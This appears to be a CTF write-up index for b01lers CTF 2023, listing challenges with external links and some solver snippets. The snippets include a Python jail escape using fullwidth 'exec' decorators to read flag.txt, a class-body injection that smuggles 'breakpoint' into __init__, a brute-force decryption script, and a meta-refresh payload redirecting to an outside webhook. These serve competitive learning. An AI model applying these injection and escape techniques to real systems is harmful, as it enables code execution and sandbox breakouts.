---
title: b01lers CTF 2023
weight: 0
---
# b01lers CTF 2023
- [GitHub](https://github.com/b01lers/b01lers-ctf-2023-public)
- [CTFtime](https://ctftime.org/event/1875)

## **crypto**
### majestic
### poeticrypto
{{< details title="vEvergarden#4300" open=false >}}
```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2

import concurrent.futures
import sys

ct = "e1b3b6d018197c01a83f60ad67ba9f51d01b689c525db8ca1e28b547"

def bf(s):
    x = PBKDF2(b'03/17/2023',b"Grow grow grow!!", dkLen=32, count=10000, hmac_hash_module=SHA256)
    z = PBKDF2(x,s,dkLen=32, count=100, hmac_hash_module=SHA256)

    SOMETHING = b'For dust you are and to dust you shall return!'
    y = AES.new(SHA256.new(z[len(z)//2:] + SOMETHING).digest(),AES.MODE_GCM,nonce=b'00000000').decrypt(bytes.fromhex(ct))

    if b"bctf{" in y:
        print("FLAG:", y)
        return y
    return None


with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
    futures = [executor.submit(bf, i.to_bytes(2, 'big')) for i in range(2 ** 16)]
    print("here")
    for f in concurrent.futures.as_completed(futures):
        if f.result():
            print(f.result())
            sys.exit(0)
```
{{< /details>}}
### voidciphr


## **misc**
### abhs
### blacklisted

{{< details title="crazyman#6644" open=false >}}
```python
from pwn import *

context.log_level = 'debug'

payload = [
    '@ｅｘｅｃ'.encode(),
    b'@input',
    b'class\x0cX:pass',
    b'', # an empty line to exec
]

r = remote('blacklisted.bctf23-codelab.kctf.cloud', 1337)

for p in payload:
    r.sendlineafter(b'>>> ', p)

r.sendlineafter(b"<class '__main__.X'>", b"print(open('flag.txt').read())")
print(r.recvline())
```
{{< /details >}}
### cheating-scandal
### ezclass
- https://pwnzer0tt1.it/posts/ez-class/

{{< details title="despawningbone#4078" open=false >}}
```python
from pwn import *

p = remote('ezclass.bctf23-codelab.kctf.cloud', 1337)

p.sendlineafter(b'Run class', b'1')
p.sendlineafter(b'name', b'test')
p.sendlineafter(b'inherit', b'')
p.sendlineafter(b'many methods', b'1')
p.sendlineafter(b'method name', b'test')
p.sendlineafter(b'method params', b'self')
p.sendlineafter(b'method body', b'pass\r\t__init__ = breakpoint')

p.sendlineafter(b'Run class', b'2')
p.sendlineafter(b'name', b'test')
p.sendlineafter(b'dependancies', b'')

p.interactive()
```
{{< /details >}}
### no-copy-allowed
### switcheroo
### yarn hashing
- https://pwnzer0tt1.it/posts/yarn_hashing/
- https://github.com/nicolapace/CTF-Writeups/blob/main/b01lersCTF_2023/yarn_hashing/writeup.md


## **pwn**
### cfifufuuufuuuuu
- https://blog.snwo.kr/posts/(ctf)-b01lers-ctf-2023/
### knock_knock
### baby noah
- https://blog.snwo.kr/posts/(ctf)-b01lers-ctf-2023/
### Transcendental
- https://uz56764.tistory.com/91


## **rev**
### babynoah
### chicago
### padlock
- https://bronson113.github.io/2023/03/23/b01lersctf-padlock.html
- https://github.com/peace-ranger/CTF-WriteUps/tree/main/2023/b01lers%20CTF/(rev)%20padlock
### safe


## **web**
### fishy-motd
- https://pwnzer0tt1.it/posts/fishy-motd/

{{< details title="salvatore.abello#8649" open=true >}}
```html
<meta http-equiv="Refresh" content="1.1; url='http://webhook.lol'" />
```
{{< /details >}}

### php.galf
### warmup

